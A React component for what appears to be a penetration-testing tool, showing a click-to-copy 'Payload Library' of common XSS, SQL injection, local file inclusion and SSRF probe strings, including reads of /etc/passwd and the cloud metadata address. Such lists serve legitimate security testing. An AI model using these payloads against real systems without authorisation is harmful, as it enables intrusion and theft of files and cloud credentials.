import React, { useState } from 'react';

const PAYLOADS = {
  XSS: [
    `"><svg onload=alert(1)>`,
    `javascript:alert(1)//`,
    `"><script>alert(document.domain)</script>`
  ],
  SQLi: [
    `' OR 1=1--`,
    `" OR 1=1--`,
    `' UNION SELECT null, null, null--`
  ],
  LFI: [
    `../../../../../../../../etc/passwd`,
    `/etc/passwd%00`,
    `php://filter/convert.base64-encode/resource=index.php`
  ],
  SSRF: [
    `http://169.254.169.254/latest/meta-data/`,
    `http://127.0.0.1:80`,
    `file:///etc/passwd`
  ]
};

export const PayloadLibrary: React.FC = () => {
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);

  const handleCopy = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedPayload(payload);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  return (
    <div className="payload-library" style={{ padding: '1rem', background: '#1e1e1e', color: '#fff', borderRadius: '8px' }}>
      <h3>Payload Library</h3>
      <p style={{ fontSize: '0.9rem', color: '#aaa' }}>Click any payload to copy it to your clipboard.</p>
      
      {Object.entries(PAYLOADS).map(([category, payloads]) => (
        <div key={category} style={{ marginBottom: '1rem' }}>
          <h4 style={{ color: '#00d4ff', marginBottom: '0.5rem' }}>{category}</h4>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
            {payloads.map((payload, idx) => (
              <div 
                key={idx} 
                onClick={() => handleCopy(payload)}
                style={{
                  background: '#2d2d2d',
                  padding: '0.5rem',
                  borderRadius: '4px',
                  fontFamily: 'monospace',
                  cursor: 'pointer',
                  border: '1px solid #444',
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}
              >
                <span>{payload}</span>
                {copiedPayload === payload && <span style={{ color: '#00ff00', fontSize: '0.8rem' }}>Copied!</span>}
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
};